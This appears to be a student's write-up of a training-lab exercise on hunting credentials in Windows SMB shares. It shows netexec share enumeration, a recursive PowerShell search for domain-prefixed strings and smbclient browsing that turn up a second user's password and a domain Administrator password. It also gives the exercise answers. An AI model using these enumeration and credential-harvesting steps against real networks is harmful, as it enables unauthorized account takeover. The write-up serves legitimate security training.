# Section 19: Credential Hunting in Network Shares

Module: 10. Password Attacks

---

## Questions & Answers

### 1. One of the shares mendres has access to contains valid credentials of another domain user. What is their password?

Context:
```bash
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@pwnbox7]─[~]
└──╼ [★]$ netexec smb 10.129.234.173 -u mendres -p 'Inlanefreight2025!' --sharesSMB         10.129.234.173  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.173  445    DC01             [+] inlanefreight.local\mendres:Inlanefreight2025! 
SMB         10.129.234.173  445    DC01             [*] Enumerated shares
SMB         10.129.234.173  445    DC01             Share           Permissions     Remark
SMB         10.129.234.173  445    DC01             -----           -----------     ------
SMB         10.129.234.173  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.234.173  445    DC01             C$                              Default share
SMB         10.129.234.173  445    DC01             Company         READ            
SMB         10.129.234.173  445    DC01             Finance                         
SMB         10.129.234.173  445    DC01             HR              READ            
SMB         10.129.234.173  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.234.173  445    DC01             IT              READ            
SMB         10.129.234.173  445    DC01             Marketing                       
SMB         10.129.234.173  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.234.173  445    DC01             Sales                           
SMB         10.129.234.173  445    DC01             SYSVOL          READ            Logon server share 
```
- RDP to the target then:
```powershell
PS C:\Users\mendres> Get-ChildItem -Recurse -Include *.* \\DC01.inlanefreight.local\IT | Select-String -Pattern "INLANEFREIGHT\\"
>>
Get-ChildItem : Access to the path '\\DC01.inlanefreight.local\IT\Admin' is denied.
At line:1 char:1
+ Get-ChildItem -Recurse -Include *.* \\DC01.inlanefreight.local\IT | S ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\DC01.inlanefreight.local\IT\Admin:String) [Get-ChildItem], Unauthor
   izedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand


\\DC01.inlanefreight.local\IT\Tools\split_tunnel.txt:5:# Auth backup password: INLANEFREIGHT\jbader:ILovePower333###
```

**Answer:** `ILovePower333###`

---

### 2. As this user, search through the additional shares they have access to and identify the password of a domain administrator. What is it?

Context:
```bash
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@pwnbox7]─[~]
└──╼ [★]$ netexec smb 10.129.234.173 -u jbader -p 'ILovePower333###' --shares
SMB         10.129.234.173  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.173  445    DC01             [+] inlanefreight.local\jbader:ILovePower333### 
SMB         10.129.234.173  445    DC01             [*] Enumerated shares
SMB         10.129.234.173  445    DC01             Share           Permissions     Remark
SMB         10.129.234.173  445    DC01             -----           -----------     ------
SMB         10.129.234.173  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.234.173  445    DC01             C$                              Default share
SMB         10.129.234.173  445    DC01             Company         READ,WRITE      
SMB         10.129.234.173  445    DC01             Finance         READ,WRITE      
SMB         10.129.234.173  445    DC01             HR              READ,WRITE      
SMB         10.129.234.173  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.234.173  445    DC01             IT              READ,WRITE      
SMB         10.129.234.173  445    DC01             Marketing       READ,WRITE      
SMB         10.129.234.173  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.234.173  445    DC01             Sales           READ,WRITE      
SMB         10.129.234.173  445    DC01             SYSVOL          READ            Logon server share 
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@pwnbox7]─[~]
└──╼ [★]$ smbclient //10.129.234.173/HR -U jbader
Password for [WORKGROUP\jbader]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Aug  4 23:28:22 2026
  ..                                  D        0  Tue Aug  4 23:28:22 2026
  Confidential                        D        0  Thu May  1 12:23:18 2025
  Public                              D        0  Thu May  1 12:23:19 2025

		5056511 blocks of size 4096. 1233412 blocks available
smb: \> cd Confidential\
smb: \Confidential\> ls
  .                                   D        0  Thu May  1 12:23:18 2025
  ..                                  D        0  Thu May  1 12:23:18 2025
  Benefits_Overview_109.rtf           A     4986  Thu May  1 12:23:18 2025
  Benefits_Overview_114.rtf           A     5532  Thu May  1 12:23:18 2025
  Benefits_Overview_263.docx          A     3504  Thu May  1 12:23:17 2025
  Benefits_Overview_356.pdf           A     2022  Thu May  1 12:23:17 2025
  Benefits_Overview_505.rtf           A     6702  Thu May  1 12:23:18 2025
  Benefits_Overview_718.rtf           A     1710  Thu May  1 12:23:17 2025
  Benefits_Overview_722.docx          A     1320  Thu May  1 12:23:17 2025
  Benefits_Overview_868.txt           A     7874  Thu May  1 12:23:18 2025
  FAQ_114.txt                         A     4026  Thu May  1 12:23:18 2025
  FAQ_287.txt                         A     2362  Thu May  1 12:23:18 2025
  FAQ_337.docx                        A     2426  Thu May  1 12:23:18 2025
  FAQ_340.txt                         A     6074  Thu May  1 12:23:17 2025
  FAQ_394.txt                         A     7240  Thu May  1 12:23:18 2025
  FAQ_408.docx                        A     5242  Thu May  1 12:23:17 2025
  FAQ_420.rtf                         A     4538  Thu May  1 12:23:17 2025
  FAQ_453.rtf                         A     2490  Thu May  1 12:23:18 2025
  FAQ_675.docx                        A     4538  Thu May  1 12:23:17 2025
  FAQ_994.txt                         A     2938  Thu May  1 12:23:18 2025
  Holiday_Schedule_185.rtf            A     2612  Thu May  1 12:23:18 2025
  Holiday_Schedule_324.txt            A     5923  Thu May  1 12:23:17 2025
  Holiday_Schedule_399.rtf            A     6539  Thu May  1 12:23:17 2025
  Holiday_Schedule_427.txt            A     6231  Thu May  1 12:23:17 2025
  Holiday_Schedule_438.rtf            A     8085  Thu May  1 12:23:17 2025
  Holiday_Schedule_525.docx           A     3536  Thu May  1 12:23:18 2025
  Holiday_Schedule_593.txt            A     8787  Thu May  1 12:23:18 2025
  Holiday_Schedule_601.txt            A     8943  Thu May  1 12:23:18 2025
  Holiday_Schedule_836.pdf            A     4460  Thu May  1 12:23:18 2025
  Holiday_Schedule_911.txt            A     3151  Thu May  1 12:23:17 2025
  Holiday_Schedule_991.docx           A     4383  Thu May  1 12:23:18 2025
  HR_Guide_614.rtf                    A     4272  Thu May  1 12:23:17 2025
  HR_Guide_636.txt                    A     1926  Thu May  1 12:23:18 2025
  HR_Guide_643.rtf                    A     4548  Thu May  1 12:23:17 2025
  HR_Guide_652.rtf                    A     5100  Thu May  1 12:23:18 2025
  HR_Guide_677.txt                    A     4272  Thu May  1 12:23:17 2025
  HR_Guide_724.rtf                    A     4617  Thu May  1 12:23:18 2025
  HR_Guide_828.rtf                    A     6895  Thu May  1 12:23:18 2025
  HR_Guide_831.docx                   A     7245  Thu May  1 12:23:18 2025
  HR_Guide_895.txt                    A     7315  Thu May  1 12:23:18 2025
  HR_Guide_917.rtf                    A     6342  Thu May  1 12:23:18 2025
  Leave_Request_162.docx              A     8820  Thu May  1 12:23:18 2025
  Leave_Request_251.rtf               A     4730  Thu May  1 12:23:18 2025
  Leave_Request_591.pdf               A     1918  Thu May  1 12:23:17 2025
  Leave_Request_643.pdf               A     1548  Thu May  1 12:23:18 2025
  Leave_Request_776.docx              A     1252  Thu May  1 12:23:18 2025
  Leave_Request_787.rtf               A     6580  Thu May  1 12:23:18 2025
  Leave_Request_827.txt               A     1992  Thu May  1 12:23:17 2025
  Onboarding_Docs_132.txt             A     1167  Thu May  1 13:33:49 2025
  Onboarding_Docs_169.txt             A     8981  Thu May  1 12:23:17 2025
  Onboarding_Docs_180.txt             A     5770  Thu May  1 12:23:18 2025
  Onboarding_Docs_316.txt             A     2046  Thu May  1 12:23:17 2025
  Onboarding_Docs_430.docx            A     3566  Thu May  1 12:23:18 2025
  Onboarding_Docs_459.txt             A     7366  Thu May  1 12:23:18 2025
  Onboarding_Docs_461.pdf             A     1134  Thu May  1 12:23:18 2025
  Onboarding_Docs_506.rtf             A     7062  Thu May  1 12:23:17 2025
  Onboarding_Docs_787.pdf             A     4858  Thu May  1 12:23:18 2025
  Onboarding_Docs_914.txt             A     7214  Thu May  1 12:23:18 2025
  Onboarding_Docs_934.txt             A     9058  Thu May  1 12:23:17 2025
  Onboarding_Docs_950.docx            A     1742  Thu May  1 12:23:17 2025
  Performance_Form_152.docx           A     4306  Thu May  1 12:23:18 2025
  Performance_Form_273.txt            A     3536  Thu May  1 12:23:17 2025
  Performance_Form_433.txt            A     5076  Thu May  1 12:23:17 2025
  Performance_Form_474.txt            A     8865  Thu May  1 12:23:18 2025
  Performance_Form_545.docx           A     3536  Thu May  1 12:23:18 2025
  Performance_Form_636.txt            A     5692  Thu May  1 12:23:18 2025
  Performance_Form_791.rtf            A     3459  Thu May  1 12:23:17 2025
  Performance_Form_901.rtf            A     6847  Thu May  1 12:23:18 2025
  Policy_Summary_197.pdf              A     5544  Thu May  1 12:23:18 2025
  Policy_Summary_225.docx             A     5094  Thu May  1 12:23:18 2025
  Policy_Summary_312.txt              A     8787  Thu May  1 12:23:18 2025
  Policy_Summary_603.pdf              A     5619  Thu May  1 12:23:18 2025
  Policy_Summary_655.docx             A     6369  Thu May  1 12:23:17 2025
  Policy_Summary_696.txt              A     1944  Thu May  1 12:23:18 2025
  Policy_Summary_880.rtf              A     6369  Thu May  1 12:23:18 2025
  Policy_Summary_916.rtf              A     8331  Thu May  1 12:23:18 2025
  Policy_Summary_940.txt              A     4194  Thu May  1 12:23:18 2025
  Policy_Summary_968.docx             A     7344  Thu May  1 12:23:18 2025
  Policy_Summary_995.txt              A     3144  Thu May  1 12:23:17 2025
  Staff_Update_125.txt                A     5104  Thu May  1 12:23:18 2025
  Staff_Update_136.docx               A     7002  Thu May  1 12:23:17 2025
  Staff_Update_140.docx               A     4082  Thu May  1 12:23:18 2025
  Staff_Update_182.pdf                A     6856  Thu May  1 12:23:17 2025
  Staff_Update_193.pdf                A     7075  Thu May  1 12:23:18 2025
  Staff_Update_245.pdf                A     7591  Thu May  1 12:23:17 2025
  Staff_Update_325.docx               A     8035  Thu May  1 12:23:17 2025
  Staff_Update_476.pdf                A     4301  Thu May  1 12:23:18 2025
  Staff_Update_523.docx               A     1454  Thu May  1 12:23:18 2025
  Staff_Update_542.rtf                A     4228  Thu May  1 12:23:17 2025
  Staff_Update_544.txt                A     2111  Thu May  1 12:23:18 2025
  Staff_Update_675.docx               A     8183  Thu May  1 12:23:18 2025
  Staff_Update_734.rtf                A     6783  Thu May  1 12:23:18 2025
  Staff_Update_832.rtf                A     5615  Thu May  1 12:23:18 2025
  Staff_Update_885.txt                A     8553  Thu May  1 12:23:17 2025
  Staff_Update_887.rtf                A     5250  Thu May  1 12:23:18 2025
  Training_Info_103.txt               A     4730  Thu May  1 12:23:18 2025
  Training_Info_144.docx              A     4064  Thu May  1 12:23:17 2025
  Training_Info_275.docx              A     4656  Thu May  1 12:23:17 2025
  Training_Info_308.docx              A     4656  Thu May  1 12:23:18 2025
  Training_Info_464.docx              A     4878  Thu May  1 12:23:18 2025
  Training_Info_544.docx              A     3620  Thu May  1 12:23:18 2025
  Training_Info_628.txt               A     5840  Thu May  1 12:23:17 2025

		5056511 blocks of size 4096. 1233425 blocks available

```
- Found tons of files here, searching through these files and finally found the correct file containing what we need:
```bash
smb: \Confidential\> get Onboarding_Docs_132.txt 
getting file \Confidential\Onboarding_Docs_132.txt of size 1167 as Onboarding_Docs_132.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \Confidential\> !cat Onboarding_Docs_132.txt 
========================================
Employee Onboarding Checklist
========================================

Name: Josh Bader  
Start Date: 2025-04-29  
Department: IT Infrastructure  
Manager: R. Lawson  
Title: Systems Engineer III  
Role Level: Tier-0 Admin  

Checklist:
[✔] AD Account Created  
[✔] Email Provisioned  
[✔] Assigned to Admin VPN Group  
[✔] Azure Admin Portal Access  
[✔] Exchange Online Admin  
[✔] Domain Admin Rights Applied  

Notes:
Jordan will be responsible for oversight of Active Directory replication, GPO management, and DC patching. Temporarily granted access to the domain administrator account for initial 90 days to complete infrastructure tasks related to the Chicago DC migration.

Account credentials
**Username:** `Administrator`  
**Password:** `Str0ng_Adm1nistrat0r_P@ssword_2025!`  

Note: Update account group membership after probationary period. Audit required every 30 days.

Action Items:
- Schedule orientation w/ Infosec (B. Chen)
- Issue YubiKey (Asset #YK-78218)
- Complete privileged access training (SecOps LMS)

-- Document Created by R.Lawson on 2025-04-28
smb: \Confidential\> get Onboarding_Docs_169.txt
getting file \Confidential\Onboarding_Docs_169.txt of size 8981 as Onboarding_Docs_169.txt (10.2 KiloBytes/sec) (average 2.6 KiloBytes/sec)
```

**Answer:** `Str0ng_Adm1nistrat0r_P@ssword_2025!
`

---

[Back to Module Index](./README.md)
